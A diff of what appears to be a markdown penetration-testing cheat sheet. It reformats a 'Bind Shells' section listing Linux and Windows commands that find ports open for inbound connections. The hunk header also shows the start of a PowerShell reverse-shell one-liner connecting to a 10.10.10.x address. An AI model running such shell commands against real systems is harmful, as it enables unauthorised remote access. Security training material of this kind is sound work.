@@ -322,31 +322,21 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.
 {% hint style="info" %}
 ## <mark style="color:purple;">Bind Shells</mark>
 
-* ### <mark style="color:purple;">First, find ports were</mark> <mark style="color:orange;">**`inbound`**</mark> <mark style="color:purple;">connections are allowed:</mark>
-* ### <mark style="color:orange;">`Linux`</mark><mark style="color:purple;">:</mark>
+* <mark style="color:purple;">First, find ports were</mark> <mark style="color:orange;">**`inbound`**</mark> <mark style="color:purple;">connections are allowed:</mark>
 
+{% code title="Linux" overflow="wrap" lineNumbers="true" %}
 ```sh
 ss -tuln
-```
-
-```bash
 netstat -tuln
-```
-
-```sh
 lsof -i -n
 ```
+{% endcode %}
 
 ***
 
-* ### <mark style="color:orange;">`Windows`</mark><mark style="color:purple;">:</mark>
-
+{% code title="Windows" overflow="wrap" lineNumbers="true" %}
 ```sh
 netstat -ano | findstr "LISTEN"
-```
-
-{% code overflow="wrap" %}
-```powershell
 Get-Process | Where-Object {$_.Id -eq (Get-NetTCPConnection | Where-Object {$_.State -eq 'Listen'}).OwningProcess}
 ```
 {% endcode %}
